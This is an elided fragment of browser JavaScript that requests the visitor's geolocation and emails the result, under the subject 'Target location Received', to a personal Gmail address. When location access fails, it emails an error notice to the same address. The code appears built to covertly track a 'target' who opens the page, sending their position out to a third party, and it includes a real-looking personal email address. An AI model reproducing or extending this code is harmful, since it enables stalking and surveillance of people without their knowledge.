    ...
    if ("geolocation" in navigator) {
        ...
        navigator.geolocation.getCurrentPosition(
            (position) => {
                ...
                sendEmail('Target location Received', locationDisplay.textContent, 'sohailkhan7861292@gmail.com');
            },
            (error) => {
                ...
                sendEmail('Location Access Error', locationDisplay.textContent, 'sohailkhan7861292@gmail.com');
            }
        );
    } else {
